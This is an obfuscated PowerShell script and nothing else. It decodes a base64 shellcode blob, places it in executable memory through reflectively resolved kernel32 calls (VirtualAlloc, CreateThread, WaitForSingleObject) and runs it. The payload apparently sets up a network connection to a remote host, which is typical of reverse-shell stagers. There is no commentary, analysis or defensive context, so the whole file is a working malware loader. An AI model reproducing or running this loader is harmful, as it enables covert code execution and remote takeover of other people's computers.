function ngTo2sN3 {
	Param ($kPibH7u, $kl_qH2jtcs5)		
	$wlkNSKv = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $wlkNSKv.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($wlkNSKv.GetMethod('GetModuleHandle')).Invoke($null, @($kPibH7u)))), $kl_qH2jtcs5))
}

function pvPTfNxWHXpI {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $k4ddr,
		[Parameter(Position = 1)] [Type] $sxTv7 = [Void]
	)
	
	$eiznRdBnp = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$eiznRdBnp.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $k4ddr).SetImplementationFlags('Runtime, Managed')
	$eiznRdBnp.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $sxTv7, $k4ddr).SetImplementationFlags('Runtime, Managed')
	
	return $eiznRdBnp.CreateType()
}

[Byte[]]$l3K = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFddlksM0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoFQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZu+AdKgpBidr/1Q==")
		
$hvj9X = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ngTo2sN3 kernel32.dll VirtualAlloc), (pvPTfNxWHXpI @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $l3K.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($l3K, 0, $hvj9X, $l3K.length)

$uIGsff8UJPS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ngTo2sN3 kernel32.dll CreateThread), (pvPTfNxWHXpI @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$hvj9X,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ngTo2sN3 kernel32.dll WaitForSingleObject), (pvPTfNxWHXpI @([IntPtr], [Int32]))).Invoke($uIGsff8UJPS,0xffffffff) | Out-Null